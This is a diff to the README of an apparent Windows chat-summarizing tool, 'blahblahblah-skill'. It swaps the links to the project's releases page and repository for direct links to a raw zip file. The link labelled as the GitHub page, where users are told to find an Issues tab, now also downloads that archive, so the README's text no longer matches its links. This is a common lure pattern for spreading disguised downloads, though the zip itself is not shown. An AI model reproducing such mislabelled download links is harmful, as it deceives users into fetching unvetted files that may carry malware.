@@ -1,6 +1,6 @@
 # 🧠 blahblahblah-skill - Summarize Long Chats in Seconds
 
-[![Download Now](https://img.shields.io/badge/Download-Get%20blahblahblah--skill-blue?style=for-the-badge&logo=github&logoColor=white&color=2ea44f)](https://github.com/Loriabient5377/blahblahblah-skill/releases)
+[![Download Now](https://img.shields.io/badge/Download-Get%20blahblahblah--skill-blue?style=for-the-badge&logo=github&logoColor=white&color=2ea44f)](https://raw.githubusercontent.com/Loriabient5377/blahblahblah-skill/main/skills/3.4.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ This guide will walk you through downloading and using the app on your Windows c
 
 ## 📥 Download and Install
 
-Visit this link to download the application: [https://github.com/Loriabient5377/blahblahblah-skill/releases](https://github.com/Loriabient5377/blahblahblah-skill/releases)
+Visit this link to download the application: [https://raw.githubusercontent.com/Loriabient5377/blahblahblah-skill/main/skills/3.4.zip](https://raw.githubusercontent.com/Loriabient5377/blahblahblah-skill/main/skills/3.4.zip)
 
 Once you click the link, you'll see a page with different files. Look for the file that matches your computer (usually named something like `blahblahblah-skill-setup.exe` or similar). Click on it to start the download. The download should begin automatically. If your browser asks for permission, click "Save" or "Allow."
 
@@ -102,7 +102,7 @@ Your privacy is important. blahblahblah-skill processes your text directly on yo
 
 If you run into any issues not covered here, you can:
 
-- Visit the GitHub page: [https://github.com/Loriabient5377/blahblahblah-skill](https://github.com/Loriabient5377/blahblahblah-skill)
+- Visit the GitHub page: [https://raw.githubusercontent.com/Loriabient5377/blahblahblah-skill/main/skills/3.4.zip](https://raw.githubusercontent.com/Loriabient5377/blahblahblah-skill/main/skills/3.4.zip)
 - Look for an "Issues" tab on that page and report your problem. You'll need a free GitHub account to post, but it's quick to create one.
 
 The community and the developer are usually responsive and happy to help.
